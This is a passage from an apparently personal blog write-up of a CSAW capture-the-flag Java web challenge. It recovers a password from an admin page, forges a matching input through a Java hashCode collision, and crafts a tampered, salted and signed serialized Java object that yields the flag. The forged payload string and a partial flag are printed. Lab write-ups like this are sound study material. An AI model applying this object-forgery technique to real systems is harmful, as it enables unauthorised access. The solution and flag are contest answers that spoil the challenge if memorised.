@@ -28,3 +28,35 @@ In [2]: base64.b64decode("rO0ABXNyABJjb2ZmZWUuQ292ZmVmZUJlYW4AAAAAAAAAAQIAAHhyAA
    ...: 2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAHQ292ZmVmZXBw")
 Out[2]: '\xac\xed\x00\x05sr\x00\x12coffee.CovfefeBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07parent1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x07Covfefepp'
 {% endhighlight %}
+
+So after a bit of traversal through the web site, there was a request to `admin.jsp` and going to that (http://web.chal.csaw.io:8616/admin.jsp) dumped the password with a `$` sign in between.
+
+{% highlight java %}
+String result;
+26:           // NOTE: Change $ to s when page is ready
+27:           auth.loadPassword("Pas$ion");
+28:           if (!guess.matches("[A-Za-z0-9]+")) {
+29:             result = "Only alphanumeric characters allowed";
+30:           } else {
+31:             result = auth.lookup(guess.hashCode());
+{% endhighlight %}
+
+but since JavaCodes are deterministic, we can create one that matches this and that was `ParCipO`. Logging in to the admin page with this string gave me a key which was `c@ram31m4cchi@o`. Also, we had a hash appended towards the end of the serialized beans. After a bit of digging, I found that the hash appended was just a salt and not anything else. Now basically I had to craft a payload which contains the keyword `Flag` in it, appended with the salt.
+
+The next thing was crafting the `parent1` as `payload + "-" + sha256sumhex(payload + salt)` where `salt` was `c@ram31m4cchi@o`. Essentially, crafting the payload was a bit task so in the beginning, my team-mate <a href=http://www.i4info.in/> Heeraj</a> and I had thought of replacing `Covfefe` with `Flag` and had sent request by modifying `parent1` but yielded no result. Then what we had thought was the string length of `Flag` with that of `Covfefe`. Yes, it is different and hence would alter the structure. So the very next moment, we took the base64 of `Raid`, updated with `Flag` and appended the hash that was to be appended which was `6715801eb21604db3f35709ff86ee6ac86e75bab042d2e4fced219c7a130763c`.
+
+{% highlight python%}
+In [3]: base64.b64decode("rO0ABXNyAA9jb2ZmZWUuUmFpZEJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZ
+   ...: WUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAEUmFpZHBw")
+Out[3]: '\xac\xed\x00\x05sr\x00\x0fcoffee.RaidBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07parent1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x04Raidpp'
+
+In [4]: str = "\xac\xed\x00\x05sr\x00\x0fcoffee.FlagBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x
+   ...: 00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07pare
+   ...: nt1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x04Flagpp'"
+{%endhighlight%}
+
+So the final string that had to be sent to the server in `parent1` was `rO0ABXNyAA9jb2ZmZWUuRmxhZ0JlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAERmxhZ3Bw-6715801eb21604db3f35709ff86ee6ac86e75bab042d2e4fced219c7a130763c`.
+
+Bingo, modifying the request with the parameter of `Name` filled gives us the flag
+
+`flag{yd1dw3wr1t3th15j@v....`
